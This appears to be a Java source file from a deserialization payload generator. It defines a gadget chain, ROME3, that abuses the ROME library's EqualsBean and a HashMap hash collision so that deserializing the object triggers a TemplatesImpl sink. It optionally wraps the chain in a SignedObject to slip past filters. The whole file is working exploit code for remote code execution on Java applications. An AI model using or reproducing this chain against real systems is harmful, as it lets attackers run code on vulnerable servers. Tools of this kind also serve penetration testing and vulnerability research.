package com.ppp.chain.rome;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.GadgetDependency;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 * <p>
 * JDK8
 */
@Dependencies({"rome:rome:1.0", "JDK>1.8"})
@Sink({Sink.TemplatesImpl})
@Authors()
public class ROME3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(ROME3.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(Templates.class, sinkObject, sinksHelper.getGadgetDependency());

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object signedObject = WrapSerialization.scheduler(kickOffObject, sinksHelper);
            kickOffObject = getChain(SignedObject.class, signedObject, sinksHelper.getGadgetDependency());
        }

        return kickOffObject;
    }

    public Object getChain(Class cls, Object object, GadgetDependency dependency) throws Exception {
        if (dependency.equals(GadgetDependency.RomeTools)) {
            return rometools(cls, object);
        } else {
            return rome(cls, object);
        }
    }

    public Object rome(Class cls, Object object) throws Exception {
        Printer.yellowInfo("Using rome");
        String s = RanDomUtils.generateRandomString(1);
        EqualsBean bean = new EqualsBean(String.class, s);

        Map map1 = new HashMap();
        map1.put("aa", object);
        map1.put("bB", bean);

        Map map2 = new HashMap();
        map2.put("aa", bean);
        map2.put("bB", object);

        Reflections.setFieldValue(bean, "_beanClass", cls);
        Reflections.setFieldValue(bean, "_obj", object);

        return KickOff.makeMap(map1, map2);
    }

    public Object rometools(Class cls, Object object) throws Exception {
        Printer.yellowInfo("Using romeTools");
        String s = RanDomUtils.generateRandomString(1);
        com.rometools.rome.feed.impl.EqualsBean bean = new com.rometools.rome.feed.impl.EqualsBean(String.class, s);

        Map map1 = new HashMap();
        map1.put("aa", object);
        map1.put("bB", bean);

        Map map2 = new HashMap();
        map2.put("aa", bean);
        map2.put("bB", object);

        Reflections.setFieldValue(bean, "beanClass", cls);
        Reflections.setFieldValue(bean, "obj", object);

        return KickOff.makeMap(map1, map2);
    }
}
